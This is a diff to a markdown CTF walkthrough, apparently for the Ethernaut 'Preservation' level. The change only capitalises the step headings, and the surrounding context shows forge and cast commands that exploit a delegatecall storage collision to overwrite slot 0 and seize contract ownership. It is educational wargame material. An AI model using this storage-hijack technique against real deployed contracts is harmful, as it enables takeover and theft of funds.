@@ -59,7 +59,7 @@ This means that when we make a delegatecall to `timeZone1Library`, we are modify
 
 ### Walkthrough
 
-##### 1. create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in `src` 
+##### 1. Create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in `src` 
 ```solidity
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
@@ -75,18 +75,18 @@ contract Contract {
 }
 ```
 
-##### 2. deploy our new contract
+##### 2. Deploy our new contract
 ```console
 forge create src/Contract.sol:Contract --private-key  $PRIVATE_KEY
 ```
 
-##### 3. changing storage slot 0 to point to our malicious contract
+##### 3. Changing storage slot 0 to point to our malicious contract
 ```console
 cast send $LEVEL_ADDRESS "setFirstTime(uint)" $DEPLOYED_ADDRESS --private-key $PRIVATE_KEY
 ```
 > Replace $DEPLOYED_ADDRESS with the address of your deployed contract
 
-##### 4. calling our exploited contract through the delegatecall and passing our address as the owner
+##### 4. Calling our exploited contract through the delegatecall and passing our address as the owner
 ```console
 cast send $LEVEL_ADDRESS "setFirstTime(uint)" $NEW_OWNER --gas 60000 --private-key $PRIVATE_KEY
 ```
